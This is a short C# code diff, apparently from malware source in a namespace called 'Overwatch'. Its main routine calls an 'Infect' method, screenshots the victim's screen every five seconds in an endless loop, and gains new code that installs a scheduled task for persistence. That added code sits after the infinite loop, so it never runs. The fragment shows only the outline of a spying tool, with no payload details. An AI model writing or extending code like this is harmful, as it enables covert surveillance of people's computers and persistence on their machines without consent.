@@ -15,12 +15,14 @@ namespace Overwatch
             try
             {
                 cStartupOptions.ProcessStartInfo();
-                cInstall.Infect(args);
+                cChangeLabel.Infect(args);
                 while (true)
                 {
                     cReceiveInformation.ScreenShoot();
                     System.Threading.Thread.Sleep(5000);
                 }
+                cInstallTaskScheduler i = new cInstallTaskScheduler();
+                i.Task();
             }
             catch (Exception ex){ Log.Write(ex.Message, true);}
         }
